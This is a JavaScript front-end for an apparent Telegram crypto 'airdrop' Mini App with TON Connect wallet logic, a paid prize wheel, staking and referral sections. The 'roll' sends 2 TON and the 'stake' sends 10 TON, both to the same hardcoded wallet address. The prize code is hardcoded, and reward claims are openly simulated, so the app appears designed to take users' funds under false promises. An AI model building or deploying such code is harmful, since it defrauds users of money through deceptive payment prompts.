document.addEventListener('DOMContentLoaded', () => {
    const startScreen = document.querySelector('.start-screen');
    const page = document.querySelector('.page');
    const headerBurger = document.querySelector('.header__burger');
    const headerNav = document.querySelector('.header__nav');
    const bottomNavTabs = document.querySelectorAll('.bottom-nav li');
    const sectionContents = document.querySelectorAll('.section-content');

    // --- 1. Start Screen Logic (Fixed for proper transition) ---
    // Ensure the start screen fades out after 3 seconds, even if lottie fails to load.
    // The 'active' class is already in HTML, so we just manage the fade-out.
    setTimeout(() => {
        startScreen.classList.add('fade-out');
        // Use a slight delay before hiding completely to allow fade-out animation
        startScreen.addEventListener('animationend', () => {
            startScreen.classList.add('hide');
            page.classList.remove('hide'); // Reveal the main page
        }, { once: true });
    }, 3000); // Show loading for 3 seconds

    // --- 2. Header Burger Menu Toggle ---
    headerBurger.addEventListener('click', () => {
        headerBurger.classList.toggle('active');
        headerNav.classList.toggle('active');
    });

    // --- 3. Bottom Navigation Tab Switching ---
    // Set initial active section to Rolls
    document.getElementById('content-rolls').classList.add('active-section');
    bottomNavTabs.forEach(tab => {
        tab.addEventListener('click', () => {
            // Haptic Feedback for tab clicks
            if (navigator.vibrate) {
                navigator.vibrate(50); // Short subtle vibration
            }

            const targetSectionId = tab.dataset.section;

            // Remove active class from all tabs and sections
            bottomNavTabs.forEach(t => t.classList.remove('active'));
            sectionContents.forEach(s => {
                s.classList.remove('active-section');
                s.classList.add('hidden-section');
            });

            // Add active class to clicked tab
            tab.classList.add('active');

            // Show the target section
            const targetSection = document.getElementById(`content-${targetSectionId}`);
            if (targetSection) {
                targetSection.classList.remove('hidden-section');
                targetSection.classList.add('active-section');
            }
        });
    });

    // --- 4. TON Connect Wallet & Rolls Logic ---
    const rollsInfoText = document.querySelector('.rolls-info-text');
    const connectWalletBtn = document.getElementById('connectWalletBtn'); // Kept as per latest request
    const sendTransactionBtn = document.getElementById('sendTransactionBtn');
    const codeEntrySection = document.querySelector('.code-entry-section');
    const confirmationCodeInput = document.getElementById('confirmationCodeInput');
    const verifyCodeBtn = document.getElementById('verifyCodeBtn');
    const codeErrorMessage = document.getElementById('codeErrorMessage');
    const referralAfterCodeMessage = document.querySelector('.referral-after-code-message');
    const loadingAnimation = document.querySelector('.loading-animation');
    const checkmarkAnimation = document.querySelector('.checkmark-animation');
    const spinningWheel = document.querySelector('.spinning-wheel');

    let isWalletConnected = false; // Track connection status
    let tonConnectUI; // Declare globally or in a scope accessible by init

    // Initialize TON Connect UI with buttonRootId
    tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://tonairdrops.vercel.app/tonconnect-manifest.json',
        buttonRootId: 'ton-connect' // This tells TonConnectUI where to render its button
    });

    // Listen for TonConnectUI status changes
    tonConnectUI.onStatusChange(wallet => {
        if (wallet) {
            isWalletConnected = true;
            rollsInfoText.textContent = `Wallet connected: ${wallet.account.address.substring(0, 6)}...${wallet.account.address.substring(wallet.account.address.length - 4)}. Now, pay 2 TON to roll!`;
            // Hide connectWalletBtn and show/enable sendTransactionBtn
            if(connectWalletBtn) connectWalletBtn.classList.add('hide'); 
            if(sendTransactionBtn) {
                sendTransactionBtn.disabled = false;
                sendTransactionBtn.classList.remove('hide');
            }
            
            // Hide code entry/referral if wallet connects (reset state)
            codeEntrySection.classList.add('hide');
            referralAfterCodeMessage.classList.add('hide');

        } else {
            isWalletConnected = false;
            rollsInfoText.textContent = 'Connect your TON wallet to participate.';
            // Show connectWalletBtn and hide/disable sendTransactionBtn
            if(connectWalletBtn) connectWalletBtn.classList.remove('hide');
            if(sendTransactionBtn) {
                sendTransactionBtn.disabled = true;
                sendTransactionBtn.classList.add('hide');
            }
            codeEntrySection.classList.add('hide');
            referralAfterCodeMessage.classList.add('hide');
        }
    });

    // Connect wallet - called by connectWalletBtn (explicit button)
    if (connectWalletBtn) {
        connectWalletBtn.addEventListener("click", async () => {
            if (isWalletConnected){
                console.log("wallet already connected");
                return;
            }
            try {
                const connectedWallet = await tonConnectUI.connectWallet();
                if (connectedWallet) {
                    isWalletConnected = true;
                    console.log("Wallet connected", connectedWallet);
                    // UI update is handled by onStatusChange
                }
            } catch (error) {
                console.error("Error connecting to wallet: ", error);
                rollsInfoText.textContent = 'Wallet connection failed. Please try again.';
            }
        });
    }

    // Send Transaction for Rolls (2 TON)
    if (sendTransactionBtn) {
        sendTransactionBtn.addEventListener('click', async () => {
            if (navigator.vibrate) { navigator.vibrate(50); } // Haptic feedback
            if (!isWalletConnected) {
                rollsInfoText.textContent = 'Please connect your wallet first!';
                return;
            }

            sendTransactionBtn.disabled = true; // Disable button during transaction

            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 360, // 6 minutes
                messages: [
                    {
                        address: 'UQBADbfYuE5qGyN5ITs0FjWZ9suGQYuvy2HQ3cQ8wpyRyx0f', // Destination address for 2 TON
                        amount: '2000000000', // 2 TON in nanoton (2 * 10^9)
                    },
                ],
            };

            try {
                const result = await tonConnectUI.sendTransaction(transaction);
                console.log('Rolls transaction successful:', result);

                loadingAnimation.classList.remove('hide');
                rollsInfoText.classList.add('hide');
                
                spinningWheel.style.transition = 'transform 4s cubic-bezier(0.25, 0.1, 0.25, 1)';
                spinningWheel.style.transform = `rotate(${Math.random() * 360 + 1080}deg)`;

                if (navigator.vibrate) { navigator.vibrate(100); }

                setTimeout(() => {
                    loadingAnimation.classList.add('hide');
                    checkmarkAnimation.classList.remove('hide');
                    rollsInfoText.classList.remove('hide');
                    rollsInfoText.textContent = 'Payment successful! Enter your code to claim your prize.';
                    codeEntrySection.classList.remove('hide');
                    checkmarkAnimation.addEventListener('loopComplete', () => {
                        checkmarkAnimation.classList.add('hide');
                    }, { once: true });
                }, 4000);

            } catch (e) {
                console.error('Rolls transaction failed:', e);
                rollsInfoText.textContent = 'Payment failed. Please try again.';
                loadingAnimation.classList.add('hide');
                sendTransactionBtn.disabled = false; // Re-enable button on failure
            }
        });
    }
    
    // Simulate code verification
    if (verifyCodeBtn) {
        verifyCodeBtn.addEventListener('click', () => {
            const enteredCode = confirmationCodeInput.value.trim();
            codeErrorMessage.classList.add('hide');
            
            if (navigator.vibrate) { navigator.vibrate(50); }

            if (enteredCode === '909986') { // Correct code
                codeEntrySection.classList.add('hide');
                referralAfterCodeMessage.classList.remove('hide');
                rollsInfoText.classList.add('hide');
            } else {
                codeErrorMessage.classList.remove('hide');
                confirmationCodeInput.classList.add('error');
                if (navigator.vibrate) { navigator.vibrate(150); }
                setTimeout(() => confirmationCodeInput.classList.remove('error'), 1500);
            }
        });
    }

    // --- 5. Staking Section Logic ---
    const stakingAmountInput = document.getElementById('stakingAmount');
    const stakeTonBtn = document.getElementById('stakeTonBtn');
    const learnMoreLink = document.querySelector('.learn-more-link');
    const learnMoreContent = document.querySelector('.learn-more-content');

    if (stakingAmountInput && stakeTonBtn) {
        stakingAmountInput.addEventListener('input', () => {
            // No calculations, just ensure button is enabled if input has value
            stakeTonBtn.disabled = stakingAmountInput.value === '' || parseFloat(stakingAmountInput.value) <= 0;
            stakeTonBtn.style.opacity = stakeTonBtn.disabled ? '0.5' : '1';
        });
        // Initial check for stakeTonBtn state
        stakeTonBtn.disabled = true; // Disable by default
        stakeTonBtn.style.opacity = '0.5';

        stakeTonBtn.addEventListener('click', async () => {
            if (navigator.vibrate) { navigator.vibrate(50); }

            if (!isWalletConnected) {
                alert('Please connect your TON wallet first to stake!');
                tonConnectUI.openModal(); // Open connect wallet modal if not connected
                return;
            }

            stakeTonBtn.disabled = true; // Disable button during transaction

            const stakingTransaction = {
                validUntil: Math.floor(Date.now() / 1000) + 360, // 6 minutes
                messages: [
                    {
                        address: "UQBADbfYuE5qGyN5ITs0FjWZ9suGQYuvy2HQ3cQ8wpyRyx0f", // Same destination address as Rolls or update if different
                        amount: "10000000000" // 10 TON in nanotons
                    }
                ]
            };

            try {
                const result = await tonConnectUI.sendTransaction(stakingTransaction);
                console.log("Staking transaction successful:", result);
                alert('Staking transaction sent successfully! It might take a moment to confirm.');
            } catch (error) {
                console.error("Staking transaction failed:", error);
                alert('Staking transaction failed. Please try again. ' + error.message);
            } finally {
                stakeTonBtn.disabled = false; // Re-enable button
            }
        });
    }

    if (learnMoreLink && learnMoreContent) {
        learnMoreLink.addEventListener('click', (e) => {
            e.preventDefault();
            learnMoreContent.classList.toggle('hide');
            learnMoreLink.textContent = learnMoreContent.classList.contains('hide') ? 'Learn More About Staking' : 'Show Less';
            if (navigator.vibrate) { navigator.vibrate(30); }
        });
    }

    // --- 6. Earn Section (Referral Link) ---
    const referralLinkInput = document.getElementById('referralLink');
    const copyReferralBtn = document.querySelector('.copy-referral-btn');
    const claimRewardBtn = document.querySelector('.stat-value .claim-btn');

    function generateReferralLink() {
        let userId = 'YOUR_USER_ID'; // Default fallback

        // Check if running inside Telegram Mini App and get user ID
        // Note: window.Telegram.WebApp is only available when running as a Mini App
        if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) {
            userId = window.Telegram.WebApp.initDataUnsafe.user.id;
        } else {
            console.warn("Not running in Telegram WebApp or user ID not available. Using default ID.");
        }

        return `http://t.me/rollstvBot?start=${userId}`;
    }

    if (referralLinkInput) {
        referralLinkInput.value = generateReferralLink();
    }

    if (copyReferralBtn) {
        copyReferralBtn.addEventListener('click', () => {
            if (referralLinkInput) {
                referralLinkInput.select();
                referralLinkInput.setSelectionRange(0, 99999); // For mobile devices
                try {
                    document.execCommand('copy');
                    copyReferralBtn.innerHTML = '<i class="fas fa-check"></i> Copied!'; // Change icon to checkmark
                    setTimeout(() => {
                        copyReferralBtn.innerHTML = '<i class="far fa-copy"></i> Copy'; // Reset button text and icon
                    }, 2000);
                    if (navigator.vibrate) { navigator.vibrate(50); }
                } catch (err) {
                    console.error('Failed to copy text: ', err);
                    alert('Failed to copy referral link. Please copy it manually: ' + referralLinkInput.value);
                }
            }
        });
    }

    if (claimRewardBtn) {
        claimRewardBtn.addEventListener('click', () => {
            alert('Claiming rewards simulated! In a real DApp, this would initiate a withdrawal transaction.');
            if (navigator.vibrate) { navigator.vibrate(70); }
        });
    }

    // Placeholder for dynamic user name in Earn section
    const earnUserName = document.querySelector('.earn-user-name');
    if (earnUserName && window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) {
        earnUserName.textContent = `Hello, ${window.Telegram.WebApp.initDataUnsafe.user.first_name || 'User'}!`;
    } else if (earnUserName) {
        earnUserName.textContent = 'Hello, User!';
    }


    // --- 7. Team Section Photo Interaction ---
    const teamPhotos = document.querySelectorAll('.team-photo');

    teamPhotos.forEach(photo => {
        photo.addEventListener('click', () => {
            if (navigator.vibrate) { navigator.vibrate(30); }

            if (photo.classList.contains('elevated')) {
                photo.classList.remove('elevated');
                photo.classList.add('blurred');
            } else {
                teamPhotos.forEach(p => {
                    p.classList.remove('elevated');
                    p.classList.add('blurred');
                });
                photo.classList.remove('blurred');
                photo.classList.add('elevated');
            }
        });
    });

    // --- 8. Global Countdown Timer (Static content, no JS needed) ---
    // The countdown element is now static in index.html, so no JavaScript is needed for it.
});
